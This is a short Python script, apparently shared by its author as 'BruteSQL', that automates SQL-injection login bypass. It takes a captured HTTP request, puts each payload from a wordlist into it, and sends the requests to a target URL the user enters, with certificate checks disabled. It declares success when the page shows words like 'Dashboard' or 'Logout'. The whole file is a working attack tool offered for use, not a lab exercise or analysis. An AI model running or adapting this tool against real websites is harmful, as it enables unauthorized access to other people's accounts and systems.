import requests
import urllib3
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import os

os.system('clear')
# Banner

banners = """ 
 ____             _       ____   ___  _
| __ ) _ __ _   _| |_ ___/ ___| / _ \| |
|  _ \| '__| | | | __/ _ \___ \| | | | |
| |_) | |  | |_| | ||  __/___) | |_| | |___
|____/|_|   \__,_|\__\___|____/ \__\_\_____|
"""


print(Fore.RED + banners)
print(Fore.WHITE + "┏━ BruteForce Sqli by AdiganzzXD\n┣ [!] Github : Adiganzzxd\n┣ [!] Telegram : t.me/adiganzzxd\n┣ [!] Version 1.0\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" )

# Input URL
target_url = input(Fore.WHITE + "\n Masukkan alamat target : \n > ").strip()

# Parse request.txt
def parse_request_file(filename):
    with open(filename, 'r') as file:
        lines = file.read().splitlines()

    header_lines, body = [], ""
    in_body = False
    for line in lines:
        if line == "":
            in_body = True
            continue
        if in_body:
            body += line
        else:
            header_lines.append(line)

    if not header_lines:
        raise ValueError("req.txt kosong atau tidak valid.")

    method, _, _ = header_lines[0].split()
    headers = {}
    for line in header_lines[1:]:
        key, value = line.split(": ", 1)
        headers[key] = value

    return method, headers, body

# Ambil data dari file
method, headers, body_template = parse_request_file("req.txt")

with open("list.txt", "r") as f:
    payloads = [line.strip() for line in f if line.strip()]

print(Fore.CYAN + f"\n[+] Memulai brute force ke: {target_url}\n")

for payload in payloads:
    body = body_template.replace("§PAYLOAD§", payload)

    try:
        response = requests.request(
            method, target_url,
            headers=headers,
            data=body,
            timeout=10,
            verify=False
        )
    except requests.exceptions.RequestException as e:
        print(Fore.YELLOW + f"[!] Koneksi error: {e}")
        continue

    if "Welcome" in response.text or "Dashboard" in response.text or "Logout" in response.text:
        print(Fore.GREEN + "\n[ + ] SQLi Bypass BERHASIL!")
        print(Fore.GREEN + f"Payload : {payload}")
        break
    else:
        print(Fore.RED + "[ - ] Gagal Mencoba query :", Fore.YELLOW + payload)
        print(Fore.LIGHTBLACK_EX + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━")